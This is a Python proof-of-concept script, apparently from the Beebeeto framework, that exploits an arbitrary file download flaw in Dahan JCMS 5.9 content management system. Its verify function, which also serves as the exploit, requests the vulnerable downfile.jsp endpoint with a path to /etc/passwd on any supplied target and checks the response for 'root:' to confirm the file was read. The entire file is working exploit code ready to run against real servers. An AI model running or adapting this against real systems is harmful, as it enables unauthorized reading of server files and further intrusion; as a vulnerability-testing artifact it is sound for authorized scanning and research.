#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0122',
            'name': '大汉JCMS内容管理系统 /jcms/m_5_9/sendreport/downfile.jsp 任意文件下载漏洞 Exploit',
            'author': '雷锋',
            'create_date': '2014-10-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'JCMS',
            'vul_version': '5.9',
            'type': 'Arbitrary File Download',
            'tag': ['大汉jcms漏洞', '任意文件下载漏洞', '/jcms/m_5_9/sendreport/downfile.jsp', 'jsp'],
            'desc': 'N/A',
            'references': ['N/A',
            ]
        },
    }

    @classmethod

    def verify(cls, args):
        verify_url = args['options']['target'] + ('/jcms/m_5_9/sendreport/downfile.jsp?filename=/etc/passwd&'
                                                  'savename=passwd.txt')
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "root:" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())